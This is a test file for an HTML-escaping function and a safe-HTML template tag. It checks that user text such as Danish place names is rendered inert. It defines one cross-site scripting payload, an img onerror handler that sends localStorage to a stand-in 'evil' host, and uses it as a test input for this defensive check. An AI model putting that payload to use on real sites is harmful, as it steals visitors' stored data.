import { describe, it, expect } from 'vitest'
import { escapeHtml, html, SafeHtml } from './html'

/** Tag names the string would create if handed to innerHTML. */
const tagsIn = (s: string) => [...s.matchAll(/<\s*([a-z][a-z0-9]*)/gi)].map((m) => m[1].toLowerCase())

const XSS = 'Molen<img src=x onerror="fetch(\'//evil/?\'+localStorage)">'

describe('escapeHtml', () => {
  it('escapes the five HTML-significant characters', () => {
    expect(escapeHtml(`&<>"'`)).toBe('&amp;&lt;&gt;&quot;&#39;')
  })

  it('renders an <img onerror> payload as inert text', () => {
    const out = escapeHtml(XSS)
    expect(tagsIn(out)).toEqual([])
    expect(out).toBe('Molen&lt;img src=x onerror=&quot;fetch(&#39;//evil/?&#39;+localStorage)&quot;&gt;')
  })

  it('leaves Danish letters and emoji alone', () => {
    expect(escapeHtml('📍 Dragør mole, Køge Å')).toBe('📍 Dragør mole, Køge Å')
  })

  it('renders null, undefined and false as nothing, numbers as text', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
    expect(escapeHtml(false)).toBe('')
    expect(escapeHtml(0)).toBe('0')
    expect(escapeHtml(72)).toBe('72')
  })
})

describe('html tagged template', () => {
  it('escapes every interpolated value by default', () => {
    const out = html`<strong>📍 ${XSS}</strong><br><span>${'06:00<script>'}</span>`
    expect(out).toBeInstanceOf(SafeHtml)
    // Only the template's own tags survive — the payload creates none.
    expect(tagsIn(out.value)).toEqual(['strong', 'br', 'span'])
    expect(out.value).toContain('&lt;img src=x onerror=')
    expect(out.value).toContain('06:00&lt;script&gt;')
  })

  it('passes nested fragments through without double-escaping', () => {
    const inner = html`<br><span>${'a & b'}</span>`
    const out = html`<strong>${'x'}</strong>${inner}${false}${null}`
    expect(out.value).toBe('<strong>x</strong><br><span>a &amp; b</span>')
  })

  it('stringifies to its markup, so it can go wherever a string is expected', () => {
    expect(String(html`<b>${'<i>'}</b>`)).toBe('<b>&lt;i&gt;</b>')
  })
})
